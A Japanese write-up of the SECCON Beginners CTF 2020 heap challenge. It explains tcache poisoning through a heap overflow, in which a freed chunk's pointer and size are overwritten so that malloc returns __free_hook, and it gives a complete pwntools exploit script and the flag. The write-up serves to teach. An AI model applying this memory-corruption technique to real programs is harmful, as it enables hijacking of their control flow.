---
tags: pwn
---


# SECCON Beginners CTF 2020 - Beginner's Heap

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 作問者リポジトリ

<https://bitbucket.org/ptr-yudai/writeups-2020/src/master/SECCON_Beginners_CTF_2020/>

## Writeup

### outline

Heap Overflowを利用して、freeされた真下のチャンクのfdを書き換えて`__free_hook`に向けて予め用意された`win`関数へ向けるtcache poisoning問題。
但し、連続してmallocが出来ないのでfdを書き換えるついでにsizeも書き換えて別のサイズのtcacheへと繋げる必要がある。
Heapやtcacheのレイアウトを見ることが出来たり、ヒントで誘導している教育的な超良問でした。

### binary

手元にバイナリを用意しなくても解けた(というか当日もくれなかったっぽい)のでchecksecはしてませんしGhidraにもかけていません。
(多分ASLRとPIEが有効、問題的に`__free_hook`を使うっぽいのでFull RELRO, 当然のようにNX Enabled, Canary Foundじゃないかなと勝手に思っている)

まず最初に`__free_hook`と到達するだけでフラグをくれそうな`win`のアドレスをくれる、したがってlibcリークやコードの配置場所のリークが不要

予めmallocされているAというチャンク(サイズは0x18)がある。このAに対しては`read(0, A, 0x80)`という書き込み操作が出来る。
この他にもう1つだけmalloc(0x18)でチャンクを確保することができ、問題中ではBという名前が付いている。これはサイズが足りていればAの真下に作られる。実際に問題では4. describe heapを選択することでAの下にBが作られている様子を見ることが出来る。

```
-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
 [+] A = 0x5620901fa330
 [+] B = 0x5620901fa350

                   +--------------------+
0x00005620901fa320 | 0x0000000000000000 |
                   +--------------------+
0x00005620901fa328 | 0x0000000000000021 |
                   +--------------------+
0x00005620901fa330 | 0x0000000000000000 | <-- A
                   +--------------------+
0x00005620901fa338 | 0x0000000000000000 |
                   +--------------------+
0x00005620901fa340 | 0x0000000000000000 |
                   +--------------------+
0x00005620901fa348 | 0x0000000000000021 |
                   +--------------------+
0x00005620901fa350 | 0x0000000a6b6e756a | <-- B
                   +--------------------+
0x00005620901fa358 | 0x0000000000000000 |
                   +--------------------+
0x00005620901fa360 | 0x0000000000000000 |
                   +--------------------+
0x00005620901fa368 | 0x0000000000020ca1 |
                   +--------------------+
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
```

64bit環境ではチャンクを指すポインタの後ろにはサイズ(とprev_sizeと呼ばれる前のチャンクの使用を管理するフラグ)が格納されている。上の図ではA, Bの上に0x21が格納されていることがわかる。
これはmalloc(n)とするとnバイト以上で最も小さい16の倍数が返ることから先程のmalloc(0x18)で0x20バイト確保されていることを意味する。
そして末端バイトの1はメモリ上で直前のチャンクが割り当てられているかどうかのフラグである。チャンクサイズの下位3bitはチャンクに関するフラグに使われているため、実際のサイズはチャンクサイズの下位3bit(64bit下では4bit)を0としたものになる(つまり16の倍数)。

問題中ではこのBを確保するついでにデータを書き込むことが出来る。上の図は2. B = malloc を選択した後の図であるが`b"junk\n"`というデータを書き込んでいる(`0a 6b 6e 75 6a`の部分)。

更にこのBはfreeすることが出来る。おそらくASLRとPIEが有効なので先程とアドレスが変わっているが、一度Bをmallocしてfreeした後の図は次のようになる

```
-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
 [+] A = 0x557b34e92330
 [+] B = (nil)

                   +--------------------+
0x0000557b34e92320 | 0x0000000000000000 |
                   +--------------------+
0x0000557b34e92328 | 0x0000000000000021 |
                   +--------------------+
0x0000557b34e92330 | 0x0000000000000000 | <-- A
                   +--------------------+
0x0000557b34e92338 | 0x0000000000000000 |
                   +--------------------+
0x0000557b34e92340 | 0x0000000000000000 |
                   +--------------------+
0x0000557b34e92348 | 0x0000000000000021 |
                   +--------------------+
0x0000557b34e92350 | 0x0000000000000000 |
                   +--------------------+
0x0000557b34e92358 | 0x0000000000000000 |
                   +--------------------+
0x0000557b34e92360 | 0x0000000000000000 |
                   +--------------------+
0x0000557b34e92368 | 0x0000000000020ca1 |
                   +--------------------+
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[ 0x0000557b34e92350(rw-) ]
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Bをfreeしたのでサイズ0x20のtcacheに繋がれていることがわかる。

というわけで実際に出来るのは次の6つの選択肢になる(それ以外はプログラムが終了する)

1. `read(0, A, 0x80)`: Aに0x80バイトの書き込みを行う
2. `B = malloc(0x18); read(0, B, 0x18)`: 0x18バイトの領域としてBを確保し、そこに書き込みを行う
3. `free(B); B = NULL`: Bを解放する。この際Bを指していたポインタはヌルポインタになる
4. `Describe heap`: Heap領域中のA付近の様子を表示する、この問題のすごい機能その1
5. `Describe tcache (for size 0x20)`: tcacheの内、サイズが0x20のリンクリストを表示する、この問題のすごい機能その2
6. `Currently available hint`: 現時点の進行状況からヒントを表示する、この問題のすごい機能その3

但し、2のmallocは既にどこかの領域を確保している場合は実行出来ないため、一度3のfreeをする必要がある。
ヒープ開示によってA, Bのアドレスが上部に表示されるが`B = (nil)`であればmallocすることが出来る。

### Heap Overflow

1のAへの書き込み機能に注目するとAのサイズが0x18にも関わらず書き込みが0x80バイトも行うことが出来てしまう。Aの真下にはBだった箇所があるのでここを編集することが期待できる。

### freeされたチャンクを書き換える

ここでBだった箇所は既に何もないのだが、freeされた部分はtcache中の次のチャンクを指すようになる。
上の図の例では元々Bは`0x0000557b34e92350`を指していた(tcacheの図示より)。ここが0という事はサイズ0x20のtcacheリストの終端はBであることを意味しており、実際tcacheの状況を見るとその次が`END OF TCACHE`となっている。
ではAのHeap Overflowで次のような書き込みを行ったらどうなるかを考える。

```
                   +--------------------+
0x0000557b34e92328 | 0x0000000000000021 |
                   +--------------------+
0x0000557b34e92330 | 0xdeadbeefcafebabe | <-- A
                   +--------------------+
0x0000557b34e92338 | 0xdeadbeefcafebabe | 
                   +--------------------+
0x0000557b34e92340 | 0xdeadbeefcafebabe |
                   +--------------------+
0x0000557b34e92348 | 0x0000000000000021 | <-- no change
                   +--------------------+
0x0000557b34e92350 |   <__free_hook>    | <-- old B (next chunk in tcache: 0x20)
                   +--------------------+
```

先程tcacheの開示の際に`END OF TCACHE`となっていたのは`0x0000557b34e92350`が0だったからである。ここに何らかの値が入ったという事は次のチャンクは`__free_hook`のアドレスになることが期待される。
というわけでヒープ領域とtcacheをﾀﾞﾊﾞｧした様子が次の通り(例によってASLRとPIEによってアドレスが変わっていますが気にしないでください)

```
-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
 [+] A = 0x555b365e5330
 [+] B = (nil)

                   +--------------------+
0x0000555b365e5320 | 0x0000000000000000 |
                   +--------------------+
0x0000555b365e5328 | 0x0000000000000021 |
                   +--------------------+
0x0000555b365e5330 | 0x6161616161616161 | <-- A
                   +--------------------+
0x0000555b365e5338 | 0x6161616161616161 |
                   +--------------------+
0x0000555b365e5340 | 0x6161616161616161 |
                   +--------------------+
0x0000555b365e5348 | 0x0000000000000021 |
                   +--------------------+
0x0000555b365e5350 | 0x00007f6c481f38e8 |
                   +--------------------+
0x0000555b365e5358 | 0x000000000000000a |
                   +--------------------+
0x0000555b365e5360 | 0x0000000000000000 |
                   +--------------------+
0x0000555b365e5368 | 0x0000000000020ca1 |
                   +--------------------+
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[ 0x0000555b365e5350(rw-) ]
        ||
        \/
[ 0x00007f6c481f38e8(rw-) ]
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

予想通りtcacheに`__free_hook`のアドレス: `0x00007f6c481f38e8`が繋がっていることがわかる。
ということは、最小2回のmallocでこのアドレスをBが指すようになり、編集をして`__free_hook`を`win`に向けることが出来そう

### サイズを改竄する

...なのだが、この問題では連続して2回mallocすることは出来ない、つまり一度Bを再確保した後にBを解放し、もう一度Bを確保する必要がある。
ではその通りにしてみた結果が次の通り

```
-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
 [+] A = 0x56398dde0330
 [+] B = 0x56398dde0350

                   +--------------------+
0x000056398dde0320 | 0x0000000000000000 |
                   +--------------------+
0x000056398dde0328 | 0x0000000000000021 |
                   +--------------------+
0x000056398dde0330 | 0x6161616161616161 | <-- A
                   +--------------------+
0x000056398dde0338 | 0x6161616161616161 |
                   +--------------------+
0x000056398dde0340 | 0x6161616161616161 |
                   +--------------------+
0x000056398dde0348 | 0x0000000000000021 |
                   +--------------------+
0x000056398dde0350 | 0x00007f0a6b6e756a | <-- B
                   +--------------------+
0x000056398dde0358 | 0x000000000000000a |
                   +--------------------+
0x000056398dde0360 | 0x0000000000000000 |
                   +--------------------+
0x000056398dde0368 | 0x0000000000020ca1 |
                   +--------------------+
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[ 0x00007f39dd5e38e8(rw-) ]
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

残念ながら二度目のmallocで確保されたのは別の領域で`__free_hook`のアドレスではない。これはtcacheに入るチャンクが後入れ先出し(LIFO)であることが原因である。
AでのHeap Overflow後にmallocを行うと元々tcacheの先頭にはかつてBが指していたアドレス: `0x000056398dde0350`が繋がっていたのでそこが確保される。その後Bをfreeするとtcacheの先頭にはここが再び入ってしまう。
例によってアドレスは異なるが次のようなtcacheになる
```
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[ 0x000055b2e9eff350(rw-) ] <- old B
        ||
        \/
[ 0x00007f11041ef8e8(rw-) ] <- __free_hook
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```
そして続くmallocでここからBを確保してしまうため一向に`__free_hook`を確保する事が出来ない。そこでBがfreeされる際に別のサイズのtcacheへ繋げることを考える(ここでヒントを見ました)

そのためにAのHeap Overflowでそのままにしていたサイズを0x31とする。具体的には次のようなヒープ領域を構築するようなペイロードを送り込む。

```
                   +--------------------+
0x0000557b34e92328 | 0x0000000000000021 |
                   +--------------------+
0x0000557b34e92330 | 0xdeadbeefcafebabe | <-- A
                   +--------------------+
0x0000557b34e92338 | 0xdeadbeefcafebabe | 
                   +--------------------+
0x0000557b34e92340 | 0xdeadbeefcafebabe |
                   +--------------------+
0x0000557b34e92348 | 0x0000000000000031 | <-- size of B is changed
                   +--------------------+
0x0000557b34e92350 |   <__free_hook>    | <-- old B (next chunk in tcache: 0x20)
                   +--------------------+
```

AでのHeap Overflow -> Bのmalloc -> ヒープ領域開示 -> Bのfree -> tcache開示をした様子が次

```
-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
 [+] A = 0x556cad4e5330
 [+] B = 0x556cad4e5350

                   +--------------------+
0x0000556cad4e5320 | 0x0000000000000000 |
                   +--------------------+
0x0000556cad4e5328 | 0x0000000000000021 |
                   +--------------------+
0x0000556cad4e5330 | 0x6161616161616161 | <-- A
                   +--------------------+
0x0000556cad4e5338 | 0x6161616161616161 |
                   +--------------------+
0x0000556cad4e5340 | 0x6161616161616161 |
                   +--------------------+
0x0000556cad4e5348 | 0x0000000000000031 |
                   +--------------------+
0x0000556cad4e5350 | 0x00007f0a6b6e756a | <-- B
                   +--------------------+
0x0000556cad4e5358 | 0x000000000000000a |
                   +--------------------+
0x0000556cad4e5360 | 0x0000000000000000 |
                   +--------------------+
0x0000556cad4e5368 | 0x0000000000020ca1 |
                   +--------------------+
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[ 0x00007f756e1e68e8(rw-) ]
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Bのmalloc時、Bのサイズは確かに0x31になっている。その上でfreeし、tcacheへと繋ぐと今度はtcache (for 0x20)ではなく、tcache (for 0x30)へと繋がれることからサイズ0x20のtcacheの先頭にはめでたく`__free_hook`のアドレスが来る。
この状態で再度malloc(0x18)するとmallocアルゴリズムは頭が良いのでtcacheから適切なサイズのチャンクを返してくれる。当然サイズ0x18のチャンクを確保するのに向いているチャンクは0x30では無く0x20なのでサイズ0x20のtcacheから確保される。
それを示したのが次
```
-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
 [+] A = 0x55c40d139330
 [+] B = 0x7f904c4078e8

                   +--------------------+
0x000055c40d139320 | 0x0000000000000000 |
                   +--------------------+
0x000055c40d139328 | 0x0000000000000021 |
                   +--------------------+
0x000055c40d139330 | 0x6161616161616161 | <-- A
                   +--------------------+
0x000055c40d139338 | 0x6161616161616161 |
                   +--------------------+
0x000055c40d139340 | 0x6161616161616161 |
                   +--------------------+
0x000055c40d139348 | 0x0000000000000031 |
                   +--------------------+
0x000055c40d139350 | 0x0000000000000000 |
                   +--------------------+
0x000055c40d139358 | 0x000000000000000a |
                   +--------------------+
0x000055c40d139360 | 0x0000000000000000 |
                   +--------------------+
0x000055c40d139368 | 0x0000000000020ca1 |
                   +--------------------+
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

`[+] B = 0x7f904c4078e8`から`__free_hook`のアドレスがチャンクとして確保されていることがわかる(もちろんサイズ0x20のtcacheは空っぽになる)。ここまでくれば後はBの確保時に`win`のアドレスを書き込んであげれば`__free_hook`に`win`が入ることになり、次のfreeで`win`が呼ばれる。

ちなみに飛ぶだけではおめでとうと言われるだけでフラグが表示されず、シェルが起動してるっぽいので対話モードに入らないと表示されない

## Code

```python
from pwn import remote, p64, u64


def _select(s, sel, c=b"\n> "):
    s.recvuntil(c)
    s.sendline(sel)


def write_a(s, data=b"junk"):
    _select(s, b"1")
    s.sendline(data)


def malloc_b(s, data=b"junk"):
    _select(s, b"2")
    s.sendline(data)


def free_b(s):
    _select(s, b"3")


def desc_heap(s):
    _select(s, b"4")
    r = s.recvuntil(b"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-")
    print(r.decode())


# show tcache ("""only""" for 0x20)
def desc_tcache(s):
    _select(s, b"5")
    r = s.recvuntil(b"-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    print(r.decode())


def hint(s):
    _select(s, b"6")
    r = s.recvuntil(b"1. read(")[:-len(b"1. read(")]
    print(r.decode())


if __name__ == '__main__':
    target = "bh.quals.beginners.seccon.jp"
    port = 9002

    s = remote(target, port)
    s.recvuntil(":\n")
    s.recvline()

    # get addrs
    free_hook_addr = int(s.recvline().strip().split(b" ")[1][2:], 16)
    win_addr = int(s.recvline().strip().split(b" ")[1][2:], 16)

    print(hex(free_hook_addr))
    print(hex(win_addr))

    malloc_b(s)
    free_b(s)

    payload = b"a" * 8 * 3
    payload += p64(0x31)
    payload += p64(free_hook_addr)
    write_a(s, payload)

    malloc_b(s)
    free_b(s)
    malloc_b(s, p64(win_addr))
    free_b(s)

    # print(s.recv(4096))
    s.interactive()
```

## Flag

当日は出ていませんがまだ鯖が動いていたので取れました
`ctf4b{l1bc_m4ll0c_h34p_0v3rfl0w_b4s1cs}`

## 公式Writeup

https://ptr-yudai.hatenablog.com/entry/2020/05/24/174914#Pwn-293pts-Beginners-Heap-62-solves